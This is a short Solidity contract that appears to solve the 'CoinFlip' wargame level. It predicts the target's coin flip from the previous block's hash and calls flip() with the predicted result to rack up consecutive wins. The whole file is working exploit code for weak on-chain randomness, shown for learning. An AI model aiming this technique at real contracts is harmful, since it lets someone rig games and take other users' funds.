// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {console2} from "forge-std/console2.sol";


interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256); 
}

contract Attack {
    ICoinFlip public target;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _instance) {
        target = ICoinFlip(_instance);
    }

    function guessFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        target.flip(side);

        if(target.consecutiveWins() >= 10){
            console2.log("consecutiveWins:", target.consecutiveWins());
        }
     }
}